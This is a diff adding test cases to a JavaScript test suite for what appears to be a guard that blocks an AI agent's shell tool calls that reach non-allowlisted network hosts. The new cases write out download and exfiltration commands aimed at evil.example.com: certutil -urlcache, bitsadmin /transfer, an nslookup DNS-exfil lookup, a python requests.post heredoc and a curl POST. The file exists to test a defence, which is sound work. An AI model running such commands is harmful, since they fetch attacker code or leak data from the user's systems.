@@ -71,6 +71,23 @@ allow('PowerShell -Body with a URL inside, target allowed', { tool_name: 'PowerS
 denyCase('a URL in the data does not launder an evil TARGET', bash('curl https://evil.example.com/x -d \'{"u":"https://n8n.shaheenkiarash.com"}\''), 'not on the lane allowlist');
 denyCase('unparseable URL is unverifiable', bash('curl https://[not-a-host/x'), 'not on the lane allowlist');
 
+// --- A13-T5 (2026-09-10): binaries the list never named, plus the residual of the A13-T6 data strip.
+// All four ran ALLOW before the fix. The first is why the two defects had to be fixed together:
+// certutil was not a network binary AND the `i` flag on DATA_ARG made its `-f` match the `-F`
+// alternation, eating the URL that followed, so even adding the binary alone would not have caught it.
+denyCase('certutil -urlcache is a downloader (and its -f must not be read as -F)',
+  bash('certutil -urlcache -split -f http://evil.example.com/x out.txt'), 'not on the lane allowlist');
+denyCase('nslookup is DNS exfil with no URL to parse (the no-target rule fails closed)',
+  bash('nslookup AAAA.evil.example.com'), 'no parseable target URL');
+denyCase('bitsadmin /transfer is a downloader',
+  bash('bitsadmin /transfer j http://evil.example.com/x C:\\x'), 'not on the lane allowlist');
+denyCase('a heredoc SCRIPT body is not data: a python heredoc posting out is still egress',
+  bash('python - <<EOF\nimport requests\nrequests.post("https://evil.example.com")\nEOF'), 'not on the lane allowlist');
+// The case that keeps the two-scan split honest in the OTHER direction: a git verb inside a heredoc
+// body is text being written to a file, not a command, and must stay allowed.
+allow('git verb inside a heredoc body is still text, not a command (two-scan split)',
+  bash('cat > notes.md <<EOF\nrun git push origin main to publish\nEOF'));
+
 console.log('');
 if (fails.length) {
   console.error(`test-untrusted-guard: ${fails.length} FAILED\n  ` + fails.join('\n  '));
